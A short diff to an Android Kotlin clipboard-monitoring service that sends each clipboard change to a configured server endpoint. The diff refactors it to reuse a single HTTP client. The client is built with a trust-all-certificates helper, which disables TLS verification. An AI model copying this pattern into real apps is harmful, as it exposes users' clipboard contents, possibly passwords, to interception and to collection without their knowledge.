@@ -27,7 +27,8 @@ class ClipboardMonitorService : Service() {
     }
 
     private var clipboardManager: ClipboardManager? = null
-    private var lastClipText: String = ""
+    @Volatile private var lastClipText: String = ""
+    private val httpClient = TrustAllCertificates.createClientBuilder().build()
 
     private val clipListener = ClipboardManager.OnPrimaryClipChangedListener {
         try {
@@ -63,6 +64,8 @@ class ClipboardMonitorService : Service() {
 
     override fun onDestroy() {
         clipboardManager?.removePrimaryClipChangedListener(clipListener)
+        httpClient.dispatcher.executorService.shutdown()
+        httpClient.connectionPool.evictAll()
         stopForeground(false)
         super.onDestroy()
     }
@@ -76,14 +79,13 @@ class ClipboardMonitorService : Service() {
                     put("timestamp", System.currentTimeMillis())
                 }
 
-                val client = TrustAllCertificates.createClientBuilder().build()
                 val body = json.toString().toRequestBody("application/json".toMediaType())
                 val request = Request.Builder()
                     .url("${AndroidConfig.apiBaseUrl}/clipboard")
                     .post(body)
                     .build()
 
-                client.newCall(request).execute().use { response ->
+                httpClient.newCall(request).execute().use { response ->
                     if (response.isSuccessful) {
                         Log.d(TAG, "Clipboard data sent")
                     } else {
